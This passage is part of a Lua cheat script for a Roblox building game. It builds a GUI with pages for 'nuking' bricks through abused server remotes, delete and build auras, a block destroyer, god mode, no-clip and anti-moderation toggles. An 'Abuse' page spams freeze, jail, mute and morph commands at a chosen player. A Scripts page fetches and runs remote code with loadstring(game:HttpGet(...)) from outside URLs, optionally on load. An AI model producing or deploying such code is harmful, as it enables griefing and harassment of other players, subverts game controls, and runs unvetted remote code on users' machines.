    local remote,rootPos=getPaintRemote(); local brick=getBrick()
    if not remote or not brick then print("[FIX] missing tools"); return end
    local key="both \u{1F91D}"
    local maxRetries=8
    for attempt=1,maxRetries do
        pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,LIGHT_GRAY,"plastic","unanchor") end)
        task.wait(0.3)
        pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,LIGHT_GRAY,"unanchor","") end)
        task.wait(0.3)
        local placed=getNearestPlacedBrick()
        if placed and not placed.Anchored then print("[FIX] Unanchor confirmed attempt "..attempt); break end
        if attempt<maxRetries then
            print("[FIX] Retry unanchor "..attempt.."/"..maxRetries)
            pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,LIGHT_GRAY,"unanchor","") end)
            task.wait(0.3)
        end
    end
    -- Untoxic: spray light gray + empty text on all faces
    for _,n in ipairs(faces) do
        for _=1,2 do pcall(function() remote:FireServer(brick,faceEnums[n],rootPos,key,LIGHT_GRAY,"spray","") end); task.wait(0.08) end
    end
    print("[FIX] Done — PLASTIC + UNANCHOR + LIGHT GRAY")
end

-- BKIT destroyer
local function fireDestroyer()
    local pc=LocalPlayer.Character; if not pc then return end
    local hrp=pc:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    if not pc:FindFirstChild("Delete") then
        local bp=LocalPlayer.Backpack:FindFirstChild("Delete")
        if bp then bp.Parent=pc; task.wait(0.05) end
    end
    local del=pc:FindFirstChild("Delete"); if not del then return end
    local sc=del:FindFirstChild("Script"); if not sc then return end
    local ev=sc:FindFirstChild("Event"); if not ev then return end
    local brick=ReplicatedStorage:FindFirstChild("Brick"); if not brick then return end
    pcall(function() ev:FireServer(brick,hrp.Position) end)
end
local function fireDeleteTool(v)
    local char=LocalPlayer.Character; if not char then return end
    local del=char:FindFirstChild("Delete") or LocalPlayer.Backpack:FindFirstChild("Delete"); if not del then return end
    if del.Parent~=char then del.Parent=char end
    del=char:FindFirstChild("Delete"); if not del then return end
    local ori=del:FindFirstChild("origevent")
    if ori then pcall(function() ori:Invoke(v,v.Position) end); return end
    local sc=del:FindFirstChild("Script")
    if sc then local ev=sc:FindFirstChild("Event"); if ev then pcall(function() ev:FireServer(v,v.Position) end) end end
end

-- Chat
local function sendChat(text)
    coroutine.wrap(function()
        pcall(function() game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(text) end)
    end)()
end

-- ============================================================
-- PAGE 1: NUKE
-- ============================================================
createLabel(pgNuke,"  Face Text & Colors",C_DIM,12)

local function createFaceRow(parent, faceName)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1,0,0,38); row.BackgroundColor3=C_BG2
    row.BorderSizePixel=0; Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)

    local nameLbl = Instance.new("TextLabel",row)
    nameLbl.Size=UDim2.fromOffset(44,38); nameLbl.Position=UDim2.fromOffset(4,0)
    nameLbl.Text=faceName:sub(1,2); nameLbl.Font=Enum.Font.GothamBold; nameLbl.TextSize=10
    nameLbl.TextColor3=C_DIM; nameLbl.BackgroundTransparency=1

    -- BP button — bright orange so it's impossible to miss
    local bpBtn = Instance.new("TextButton",row)
    bpBtn.Size=UDim2.fromOffset(34,26); bpBtn.Position=UDim2.fromOffset(46,6)
    bpBtn.Text="BP"; bpBtn.Font=Enum.Font.GothamBlack; bpBtn.TextSize=11
    bpBtn.TextColor3=Color3.new(1,1,1); bpBtn.AutoButtonColor=false
    bpBtn.BackgroundColor3=C_ACCENT2  -- orange, very visible
    bpBtn.BorderSizePixel=0
    Instance.new("UICorner",bpBtn).CornerRadius=UDim.new(0,6)
    local bpStroke=Instance.new("UIStroke",bpBtn); bpStroke.Color=Color3.fromRGB(255,60,0); bpStroke.Thickness=1.5

    -- Text input
    local txt = Instance.new("TextBox",row)
    txt.Size=UDim2.new(1,-134,0,28); txt.Position=UDim2.fromOffset(84,5)
    txt.BackgroundColor3=C_BG; txt.BorderSizePixel=0
    txt.PlaceholderText=faceName.." text..."; txt.PlaceholderColor3=C_DIM
    txt.Text=""; txt.Font=Enum.Font.Gotham; txt.TextSize=11
    txt.TextColor3=C_WHITE; txt.ClearTextOnFocus=false
    Instance.new("UICorner",txt).CornerRadius=UDim.new(0,6)

    -- Color button
    local clr = Instance.new("TextButton",row)
    clr.Size=UDim2.fromOffset(28,28); clr.Position=UDim2.new(1,-36,0,5)
    clr.BackgroundColor3=Color3.fromRGB(255,0,0); clr.BorderSizePixel=0
    clr.Text=""; clr.AutoButtonColor=false
    Instance.new("UICorner",clr).CornerRadius=UDim.new(0,6)
    clr.MouseButton1Click:Connect(function() openPicker(clr) end)

    -- BP button appends bypass tag
    bpBtn.MouseButton1Click:Connect(function()
        txt.Text = txt.Text .. BP
        bpBtn.BackgroundColor3 = C_GREEN; task.wait(0.25); bpBtn.BackgroundColor3 = C_ACCENT2
    end)

    faceData[faceName] = {txt=txt, clr=clr}
end

for _, fn in ipairs(faces) do createFaceRow(pgNuke, fn) end

createDivider(pgNuke)
createLabel(pgNuke,"  Actions",C_DIM,12)
createButton(pgNuke,"🔥  NUKE BRICK  (TOXIC + ANCHOR)", runNuke, CW, 42)

-- Auto Anchor toggle
createToggle(pgNuke,"⚓  Auto Anchor (keeps retrying every 2s)", function(v)
    autoAnchorActive = v
    if v then
        task.spawn(function()
            while autoAnchorActive do
                local remote,rootPos=getPaintRemote(); local brick=getBrick()
                if remote and brick then
                    local key="both \u{1F91D}"
                    pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,Color3.new(0,0,0),"anchor","") end)
                end
                task.wait(2)
            end
        end)
    end
end, CW, 36)

-- Auto Toxic toggle
createToggle(pgNuke,"☠  Auto Toxic (keeps toxifying every 2s)", function(v)
    autoToxicActive = v
    if v then
        task.spawn(function()
            while autoToxicActive do
                local remote,rootPos=getPaintRemote(); local brick=getBrick()
                if remote and brick then
                    local key="both \u{1F91D}"
                    pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,Color3.new(0,0,0),"toxic","anchor") end)
                end
                task.wait(2)
            end
        end)
    end
end, CW, 36)

local spamNuking = false
createToggle(pgNuke,"⚡  SPAM NUKE", function(v) spamNuking=v end, CW)
task.spawn(function() while task.wait(0.5) do if spamNuking then pcall(runNuke) end end end)

createButton(pgNuke,"💣  NUKE CUBES (BKIT)", function()
    local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local remote,rootPos=getPaintRemote(); local brick=getBrick()
    if remote and brick then
        local key="both \u{1F91D}"
        pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,Color3.new(0,0,0),"toxic","anchor") end)
    end
    fireDestroyer()
end, CW, 38)

-- ============================================================
-- PAGE 2: FIX
-- ============================================================
createLabel(pgFix,"  Repair / Clean Brick",C_DIM,12)
createLabel(pgFix,"  Plastic | Unanchored | Light Gray | Clears text",C_ACCENT2,11)

createButton(pgFix,"🛠  FIX BRICK  (PLASTIC + UNANCHOR + UNTOXIC)", runFix, CW, 46)

-- Auto Unanchor toggle
createToggle(pgFix,"⚓  Auto Unanchor (keeps retrying every 2s)", function(v)
    autoUnanchorActive = v
    if v then
        task.spawn(function()
            while autoUnanchorActive do
                local remote,rootPos=getPaintRemote(); local brick=getBrick()
                if remote and brick then
                    local key="both \u{1F91D}"
                    pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,LIGHT_GRAY,"unanchor","") end)
                end
                task.wait(2)
            end
        end)
    end
end, CW, 36)

-- Auto Untoxic toggle
createToggle(pgFix,"🧼  Auto Untoxic (sprays empty text every 2s)", function(v)
    autoUntoxicActive = v
    if v then
        task.spawn(function()
            while autoUntoxicActive do
                local remote,rootPos=getPaintRemote(); local brick=getBrick()
                if remote and brick then
                    local key="both \u{1F91D}"
                    for _,n in ipairs(faces) do
                        pcall(function() remote:FireServer(brick,faceEnums[n],rootPos,key,LIGHT_GRAY,"spray","") end)
                        task.wait(0.05)
                    end
                    pcall(function() remote:FireServer(brick,Enum.NormalId.Top,rootPos,key,LIGHT_GRAY,"plastic","unanchor") end)
                end
                task.wait(2)
            end
        end)
    end
end, CW, 36)

createDivider(pgFix)
createLabel(pgFix,"  Restore Build",C_DIM,12)
createButton(pgFix,"🔄  RESTORE BUILD", function()
    local col=getgenv().brickcollection
    if not col or #col==0 then print("[FIX] No brickcollection found"); return end
    local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local tool=char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build")
    if not tool then print("[FIX] No Build tool"); return end
    if tool.Parent~=char then tool.Parent=char; task.wait(0.1) end
    tool=char:FindFirstChild("Build")
    local sorted={}
    for _,v in ipairs(col) do
        if v and (v.ClassName~="Brick" and v.ClassName~="Debris") then table.insert(sorted,1,v)
        else table.insert(sorted,v) end
    end
    for _,v in ipairs(sorted) do
        if not tool then break end
        local pos=v.Position or hrp.Position
        pcall(function()
            local ev=tool:FindFirstChild("origevent")
            if ev then ev:Invoke(workspace.Terrain,Enum.NormalId.Top,pos,"detailed")
            else tool.Script.Event:FireServer(workspace.Terrain,Enum.NormalId.Top,pos,"detailed") end
        end)
        task.wait(0.15)
    end
    print("[FIX] Restore complete — "..#sorted.." blocks")
end, CW, 46)

-- ============================================================
-- PAGE 3: SLOTS
-- ============================================================
createLabel(pgSlots,"  Config Slots",C_DIM,12)
local slotBox=createTextBox(pgSlots,"Config name...",CW,32)
createButton(pgSlots,"💾  SAVE SLOT", function()
    local n=slotBox.Text; if n=="" then print("[SLOTS] Enter a name"); return end
    local data={faces={}}
    for _,fn in ipairs(faces) do
        local fd=faceData[fn]
        if fd then data.faces[fn]={text=fd.txt.Text, color={fd.clr.BackgroundColor3.R,fd.clr.BackgroundColor3.G,fd.clr.BackgroundColor3.B}} end
    end
    if writefile then
        local ok=pcall(function() writefile("WindConfigs/"..n..".json", HttpService:JSONEncode(data)) end)
        print(ok and ("[SLOTS] Saved: "..n) or "[SLOTS] Save failed")
    end
end, CW, 36)
createButton(pgSlots,"🗑  DELETE SLOT", function()
    local n=slotBox.Text; if n=="" then return end
    if delfile then pcall(function() delfile("WindConfigs/"..n..".json") end); print("[SLOTS] Deleted: "..n) end
end, CW, 36)
createButton(pgSlots,"📂  REFRESH SLOTS", function()
    if listfiles then
        local files=pcall(listfiles,"WindConfigs") and listfiles("WindConfigs") or {}
        print("[SLOTS] Configs:"); for _,f in ipairs(files) do print("  "..f) end
    end
end, CW, 36)

-- ============================================================
-- PAGE 4: AURA
-- ============================================================
createLabel(pgAura,"  Delete Aura Settings",C_DIM,12)

local auraRange=35; local auraActive=false; local auraStd=false; local auraSol=false

createLabel(pgAura,"  Range (studs):",C_DIM,11)
local auraRangeBox=createTextBox(pgAura,"35",CW,30)
auraRangeBox.ClearTextOnFocus=false
auraRangeBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n=tonumber(auraRangeBox.Text); if n and n>0 then auraRange=n end
end)
createToggle(pgAura,"🗑  Standard Delete Aura", function(v)
    auraStd=v
    if v then
        task.spawn(function()
            while auraStd do
                task.wait(0.05)
                local char=LocalPlayer.Character; if not char then task.wait(1); continue end
                local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
                for _,f in ipairs({"Bricks","Build","Placed","Blocks"}) do
                    local fl=workspace:FindFirstChild(f)
                    if fl then
                        for _,v in ipairs(fl:GetDescendants()) do
                            if v:IsA("BasePart") and (v.Position-hrp.Position).Magnitude<auraRange then
                                pcall(function() fireDeleteTool(v) end)
                            end
                        end
                    end
                end
            end
        end)
    end
end, CW)
createToggle(pgAura,"🗑  Solara Delete Aura", function(v)
    auraSol=v
    if v then
        task.spawn(function()
            while auraSol do
                task.wait(0.05)
                local char=LocalPlayer.Character; if not char then task.wait(1); continue end
                local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
                for _,part in ipairs(workspace:GetDescendants()) do
                    if part:IsA("BasePart") and (part.Position-hrp.Position).Magnitude<auraRange then
                        pcall(function() fireDeleteTool(part) end)
                    end
                end
            end
        end)
    end
end, CW)
createToggle(pgAura,"🌑  Standard Build Aura", function(v)
    if v then
        task.spawn(function()
            while v do
                task.wait(0.1)
                local char=LocalPlayer.Character; if not char then continue end
                local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
                local bt=char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build")
                if bt then
                    if bt.Parent~=char then bt.Parent=char; task.wait(0.05) end
                    bt=char:FindFirstChild("Build"); if not bt then continue end
                    local off=Vector3.new(math.random(-20,20),math.random(-5,5),math.random(-20,20))
                    pcall(function()
                        local ev=bt:FindFirstChild("origevent")
                        if ev then ev:Invoke(workspace.Terrain,Enum.NormalId.Top,hrp.Position+off,"normal")
                        else bt.Script.Event:FireServer(workspace.Terrain,Enum.NormalId.Top,hrp.Position+off,"normal") end
                    end)
                end
            end
        end)
    end
end, CW)
createToggle(pgAura,"☀  Solara Build Aura", function(v)
    if v then
        task.spawn(function()
            while v do
                task.wait(0.1)
                local char=LocalPlayer.Character; if not char then continue end
                local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
                local bt=char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build")
                if bt then
                    if bt.Parent~=char then bt.Parent=char; task.wait(0.05) end
                    bt=char:FindFirstChild("Build"); if not bt then continue end
                    local off=Vector3.new(math.random(-20,20),0,math.random(-20,20))
                    pcall(function()
                        local ev=bt:FindFirstChild("origevent")
                        if ev then ev:Invoke(workspace.Terrain,Enum.NormalId.Top,hrp.Position+off,"normal")
                        else bt.Script.Event:FireServer(workspace.Terrain,Enum.NormalId.Top,hrp.Position+off,"normal") end
                    end)
                end
            end
        end)
    end
end, CW)

-- ============================================================
-- PAGE 5: BKIT
-- ============================================================
createLabel(pgBkit,"  BKIT Destroyer",C_DIM,12)
local destroyerRunning=false
createToggle(pgBkit,"💥  BKIT DESTROYER", function(v)
    destroyerRunning=v
    if v then
        task.spawn(function()
            while destroyerRunning do pcall(fireDestroyer); task.wait(0.15) end
        end)
    end
end, CW)
createButton(pgBkit,"🔥  NUKE CUBES BURST (20x)", function()
    task.spawn(function()
        for _=1,20 do pcall(fireDestroyer); task.wait(0.1) end
    end)
end, CW, 38)

-- ============================================================
-- PAGE 6: SPAM
-- ============================================================
createLabel(pgSpam,"  Spam Build",C_DIM,12)
local spamBuildActive=false
createToggle(pgSpam,"🔁  SPAM BUILD", function(v)
    spamBuildActive=v
    if v then
        task.spawn(function()
            while spamBuildActive do
                local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local bt=char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build")
                    if bt then
                        if bt.Parent~=char then bt.Parent=char; task.wait(0.05) end
                        bt=char:FindFirstChild("Build")
                        if bt then
                            pcall(function()
                                local ev=bt:FindFirstChild("origevent")
                                if ev then ev:Invoke(workspace.Terrain,Enum.NormalId.Top,hrp.Position-Vector3.new(0,1.5,0),"normal")
                                else bt.Script.Event:FireServer(workspace.Terrain,Enum.NormalId.Top,hrp.Position-Vector3.new(0,1.5,0),"normal") end
                            end)
                        end
                    end
                end
                task.wait(0.12)
            end
        end)
    end
end, CW)

-- ============================================================
-- PAGE 7: ANTI
-- ============================================================
createLabel(pgAnti,"  Protection Suite",C_DIM,12)
createDivider(pgAnti)

local antiConns = {}
local function addConn(key,conn) if antiConns[key] then antiConns[key]:Disconnect() end; antiConns[key]=conn end
local function killConn(key) if antiConns[key] then antiConns[key]:Disconnect(); antiConns[key]=nil end end

-- GOD MODE (kept original — no touchy)
createLabel(pgAnti,"  God Mode",C_ACCENT,12)
local godActive=false
createToggle(pgAnti,"⚔  God Mode", function(v)
    godActive=v
    if v then
        workspace.FallenPartsDestroyHeight=-1e9
        addConn("godHB",RunService.Heartbeat:Connect(function()
            workspace.FallenPartsDestroyHeight=-1e9
            local char=LocalPlayer.Character; if not char then return end
            local hum=char:FindFirstChildOfClass("Humanoid"); if not hum then return end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.Dead,false) end)
            pcall(function() hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false) end)
            pcall(function() sethiddenproperty(hum,"Health",1e308) end)
            for _,p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then pcall(function() p.CanTouch=false end) end
            end
        end))
        local function reapplyGod()
            local char=LocalPlayer.Character; if not char then return end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            task.spawn(function()
                for _=1,20 do
                    hrp.CFrame=CFrame.new(0,200,0)
                    hrp.AssemblyLinearVelocity=Vector3.zero
                    hrp.AssemblyAngularVelocity=Vector3.zero
                    task.wait(0.1)
                end
            end)
        end
        addConn("godChar",LocalPlayer.CharacterAdded:Connect(function() task.wait(0.5); reapplyGod() end))
        reapplyGod()
    else
        killConn("godHB"); killConn("godChar")
        workspace.FallenPartsDestroyHeight=-500
    end
end, CW, 42)

createDivider(pgAnti)
createLabel(pgAnti,"  VPLI Methods",C_DIM,11)

-- ANTI GLITCH (VPLI)
local vpliLastSafe=nil; local vpliGlitchConn=nil
createToggle(pgAnti,"🌀  Anti Glitch (VPLI)", function(v)
    if v then
        vpliGlitchConn=RunService.RenderStepped:Connect(function()
            local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                if math.abs(hrp.Position.Y)<10000 then vpliLastSafe=hrp.CFrame end
                if math.abs(hrp.Position.Y)>10000 and vpliLastSafe then
                    hrp.AssemblyLinearVelocity=Vector3.zero; char:PivotTo(vpliLastSafe)
                    for _,p in ipairs(char:GetDescendants()) do
                        if p:IsA("BasePart") then p.Velocity=Vector3.zero; p.RotVelocity=Vector3.zero end
                    end
                end
            end
        end)
    else
        if vpliGlitchConn then vpliGlitchConn:Disconnect(); vpliGlitchConn=nil end
        vpliLastSafe=nil
    end
end, CW, 34)

-- ANTI FREEZE (VPLI — Hielo)
local vpliFreezeActive=false
createToggle(pgAnti,"🧊  Anti Freeze (VPLI)", function(v)
    vpliFreezeActive=v
    if v then task.spawn(function()
        while vpliFreezeActive do
            task.wait(0.1)
            local char=LocalPlayer.Character
            if char and char:FindFirstChild("Hielo",true) then
                local hum=char:FindFirstChildOfClass("Humanoid"); if hum then hum.Health=0 end
            end
        end
    end) end
end, CW, 34)

-- ANTI BLIND (VPLI)
local vpliBlindActive=false
createToggle(pgAnti,"🚫  Anti Blind (VPLI)", function(v)
    vpliBlindActive=v
    if v then task.spawn(function()
        while vpliBlindActive do
            task.wait(0.1)
            local pg=LocalPlayer:FindFirstChild("PlayerGui")
            if pg and pg:FindFirstChild("Blind") then pg.Blind:Destroy() end
        end
    end) end
end, CW, 34)

-- ANTI MYOPIC (VPLI)
local vpliMyopicConn=nil
createToggle(pgAnti,"👓  Anti Myopic (VPLI)", function(v)
    if v then
        vpliMyopicConn=RunService.RenderStepped:Connect(function()
            if game.Lighting then pcall(function() game.Lighting.Blur.Enabled=false end) end
        end)
    else if vpliMyopicConn then vpliMyopicConn:Disconnect(); vpliMyopicConn=nil end end
end, CW, 34)

-- ANTI FOG (VPLI)
local vpliFogConn=nil
createToggle(pgAnti,"🌫  Anti Fog (VPLI)", function(v)
    if v then
        vpliFogConn=RunService.RenderStepped:Connect(function()
            if game.Lighting and game.Lighting:FindFirstChild("Fog") then game.Lighting.Fog.Density=0 end
        end)
    else if vpliFogConn then vpliFogConn:Disconnect(); vpliFogConn=nil end end
end, CW, 34)

-- ANTI COLORLESS (VPLI)
local vpliColorConn=nil
createToggle(pgAnti,"🎨  Anti Colorless (VPLI)", function(v)
    if v then
        vpliColorConn=RunService.RenderStepped:Connect(function()
            if game.Lighting then pcall(function() game.Lighting.RGB.Enabled=false end) end
        end)
    else if vpliColorConn then vpliColorConn:Disconnect(); vpliColorConn=nil end end
end, CW, 34)

-- ANTI CRASH (VPLI)
local vpliCrashThreshold=11; local vpliCrashActive=false
createLabel(pgAnti,"  Anti Crash threshold (default 11)",C_DIM,10)
local crashThreshBox=createTextBox(pgAnti,"11",CW,28)
crashThreshBox.ClearTextOnFocus=false
crashThreshBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n=tonumber(crashThreshBox.Text); if n and n>0 then vpliCrashThreshold=n end
end)
createToggle(pgAnti,"💥  Anti Crash (VPLI)", function(v)
    vpliCrashActive=v
    if v then coroutine.wrap(function()
        while vpliCrashActive do
            local bp=LocalPlayer:FindFirstChild("Backpack")
            if bp and #bp:GetChildren()>=vpliCrashThreshold then
                local bpGui=LocalPlayer.PlayerGui:FindFirstChild("Backpack")
                if bpGui then bpGui.Enabled=false end
                for _,item in ipairs(bp:GetChildren()) do item:Destroy() end
                local safeCount=math.max(1,math.floor(vpliCrashThreshold*2/3))
                repeat task.wait(0.2) until not vpliCrashActive or #bp:GetChildren()>=safeCount
                local bpGui2=vpliCrashActive and LocalPlayer.PlayerGui:FindFirstChild("Backpack")
                if bpGui2 then bpGui2.Enabled=true end
            end
            task.wait(0.1)
        end
    end)() end
end, CW, 34)

createDivider(pgAnti)

-- ANTI MORPH (original)
local savedDesc=nil
createToggle(pgAnti,"👤  Anti Morph", function(v)
    if v then
        local char=LocalPlayer.Character
        if char then local hum=char:FindFirstChildOfClass("Humanoid"); if hum then pcall(function() savedDesc=hum:GetAppliedDescription() end) end end
        addConn("morphRespawn",LocalPlayer.CharacterAdded:Connect(function(c)
            task.wait(1); local hum=c:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() savedDesc=hum:GetAppliedDescription() end) end
        end))
        addConn("morphHB",RunService.Heartbeat:Connect(function()
            if math.random(1,90)~=1 then return end
            local char=LocalPlayer.Character; if not char then return end
            local hum=char:FindFirstChildOfClass("Humanoid"); if not hum or not savedDesc then return end
            local ok,cur=pcall(function() return hum:GetAppliedDescription() end)
            if ok and cur and (cur.HeadColor~=savedDesc.HeadColor or cur.TorsoColor~=savedDesc.TorsoColor) then
                savedDesc=nil; LocalPlayer:LoadCharacter()
            end
        end))
    else killConn("morphHB"); killConn("morphRespawn"); savedDesc=nil end
end, CW, 34)

-- FIX VAMPIRE SWORD (VPLI button)
createButton(pgAnti,"🧛  Fix Vampire Sword (VPLI)", function()
    local cam=workspace.CurrentCamera; local SGS=game:GetService("StarterGui")
    local function restoreCamera()
        repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        cam.CameraType=Enum.CameraType.Custom
        cam.CameraSubject=LocalPlayer.Character:FindFirstChild("Humanoid")
        pcall(function() SGS:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack,true) end)
    end
    LocalPlayer.CharacterAdded:Connect(function() restoreCamera() end); restoreCamera()
end, CW, 34)

-- NO CLIP (VPLI)
local vpliNoClipConn=nil
createToggle(pgAnti,"👻  No Clip (VPLI)", function(v)
    if v then
        vpliNoClipConn=RunService.Stepped:Connect(function()
            local char=LocalPlayer.Character; if not char then return end
            for _,p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") and p.CanCollide then p.CanCollide=false end
            end
        end)
    else
        if vpliNoClipConn then vpliNoClipConn:Disconnect(); vpliNoClipConn=nil end
        local char=LocalPlayer.Character; if char then
            for _,p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=true end end
        end
    end
end, CW, 34)

-- ANTI JAIL (original)
local lastOpenPos=nil
createToggle(pgAnti,"⛓  Anti Jail", function(v)
    if v then
        addConn("jail",RunService.Heartbeat:Connect(function()
            if math.random(1,20)~=1 then return end
            local char=LocalPlayer.Character; if not char then return end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local pos=hrp.Position
            local rp=RaycastParams.new(); rp.FilterType=Enum.RaycastFilterType.Exclude
            local fx={}; for _,p in ipairs(Players:GetPlayers()) do if p.Character then table.insert(fx,p.Character) end end
            rp.FilterDescendantsInstances=fx
            local dirs={Vector3.new(1,0,0),Vector3.new(-1,0,0),Vector3.new(0,0,1),Vector3.new(0,0,-1)}
            local blocked=0; for _,d in ipairs(dirs) do if workspace:Raycast(pos,d*6,rp) then blocked=blocked+1 end end
            if blocked<4 then lastOpenPos=pos
            else
                local parts={}
                for _,p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") and p.CanCollide then table.insert(parts,p); p.CanCollide=false end
                end
                hrp.AssemblyLinearVelocity=Vector3.zero
                hrp.CFrame=CFrame.new(pos+Vector3.new(0,30,0))
                task.wait(0.1)
                hrp.CFrame=CFrame.new((lastOpenPos or Vector3.new(0,5,0))+Vector3.new(0,5,0))
                for _,p in ipairs(parts) do pcall(function() p.CanCollide=true end) end
            end
        end))
    else killConn("jail"); lastOpenPos=nil end
end, CW, 34)

-- ============================================================
-- PAGE 8: SCRIPTS
-- ============================================================
createLabel(pgScripts,"  Script Loaders",C_DIM,12)
createDivider(pgScripts)

local autoExecVpli=false; local autoExecExtra=false

createToggle(pgScripts,"⚡  Auto-execute VPLI HUB on load", function(v) autoExecVpli=v end, CW, 34)
createButton(pgScripts,"▶  VPLI HUB V2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))()
end, CW, 42)

createDivider(pgScripts)

createToggle(pgScripts,"⚡  Auto-execute Extra Stuff on load", function(v) autoExecExtra=v end, CW, 34)
createLabel(pgScripts,"  Extra Stuff Updated (2AREYOUMENTAL110)",C_ACCENT2,11)
createButton(pgScripts,"▶  Execute Extra Stuff", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))()
end, CW, 42)

task.delay(2, function()
    if autoExecVpli then pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))() end) end
    if autoExecExtra then pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))() end) end
end)

-- ============================================================
-- PAGE 9: DONATE
-- ============================================================
createLabel(pgDonate,"  Auto Donate",C_DIM,12)
createLabel(pgDonate,"  Spams ;donate at your chosen interval",C_ACCENT2,10)
createDivider(pgDonate)

local donateTarget=""; local donateActive=false; local donateThread=nil; local donateInterval=5

local donateBox=createTextBox(pgDonate,"Player name to donate to...",CW,34)
donateBox.ClearTextOnFocus=false
donateBox:GetPropertyChangedSignal("Text"):Connect(function() donateTarget=donateBox.Text end)

createLabel(pgDonate,"  Interval (seconds)",C_DIM,11)
local donateIntervalBox=createTextBox(pgDonate,"5",CW,30)
donateIntervalBox.ClearTextOnFocus=false
donateIntervalBox:GetPropertyChangedSignal("Text"):Connect(function()
    local clean=donateIntervalBox.Text:gsub("[^%d]","")
    if donateIntervalBox.Text~=clean then donateIntervalBox.Text=clean end
    local n=tonumber(clean); if n and n>=1 then donateInterval=n end
end)

local function getMyTime()
    local ls=LocalPlayer:FindFirstChild("leaderstats"); if not ls then return nil end
    for _,n in ipairs({"Time","Minutes","Seconds","Hours","Playtime","Score","Points"}) do
        local s=ls:FindFirstChild(n); if s then return tostring(math.floor(tonumber(s.Value) or 0)) end
    end
    for _,v in ipairs(ls:GetChildren()) do
        if v:IsA("IntValue") or v:IsA("NumberValue") then return tostring(math.floor(tonumber(v.Value) or 0)) end
    end
    return nil
end

createToggle(pgDonate,"💸  Auto Donate ON/OFF", function(v)
    donateActive=v
    if v then
        if donateTarget=="" then print("[DONATE] Set a player name first!"); return end
        donateThread=task.spawn(function()
            while donateActive do
                local myTime=getMyTime()
                if myTime and tonumber(myTime) and tonumber(myTime)>0 then
                    local msg=";donate "..donateTarget.." "..myTime
                    sendChat(msg); print("[DONATE] Sent: "..msg)
                end
                task.wait(donateInterval)
            end
        end)
    else
        if donateThread then task.cancel(donateThread); donateThread=nil end
    end
end, CW, 42)

createButton(pgDonate,"💬  Send Once Now", function()
    local target=donateBox.Text; if target=="" then return end
    local myTime=getMyTime()
    if myTime then sendChat(";donate "..target.." "..myTime) end
end, CW, 36)

-- ============================================================
-- PAGE 10: ABUSE
-- ============================================================
createLabel(pgAbuse,"  Abuse",C_DIM,12)
createLabel(pgAbuse,"  Spams commands on target",C_ACCENT2,10)
createDivider(pgAbuse)

local abuseTarget=""; local abuseActive=false; local abuseThread=nil; local abuseInterval=3

local abuseBox=createTextBox(pgAbuse,"Target player name...",CW,34)
abuseBox.ClearTextOnFocus=false
abuseBox:GetPropertyChangedSignal("Text"):Connect(function() abuseTarget=abuseBox.Text end)

createLabel(pgAbuse,"  Interval (seconds)",C_DIM,11)
local abuseIntervalBox=createTextBox(pgAbuse,"3",CW,30)
abuseIntervalBox.ClearTextOnFocus=false
abuseIntervalBox:GetPropertyChangedSignal("Text"):Connect(function()
    local clean=abuseIntervalBox.Text:gsub("[^%d]","")
    if abuseIntervalBox.Text~=clean then abuseIntervalBox.Text=clean end
    local n=tonumber(clean); if n and n>=1 then abuseInterval=n end
end)

local function findPlayer(name)
    local lower=name:lower()
    for _,p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(lower,1,true) or p.DisplayName:lower():find(lower,1,true) then return p end
    end; return nil
end

local function getEnlighten()
    local char=LocalPlayer.Character
    return (char and char:FindFirstChild("The Arkenstone")) or LocalPlayer.Backpack:FindFirstChild("The Arkenstone")
end

local abuseCmds = {
    function(n) sendChat(";freeze "..n) end,
    function(n) sendChat(";glitch "..n) end,
    function(n) sendChat(";mute "..n) end,
    function(n) sendChat(";jail "..n) end,
    function(n) sendChat(";morph "..n.." dont1play2with3me") end,
}

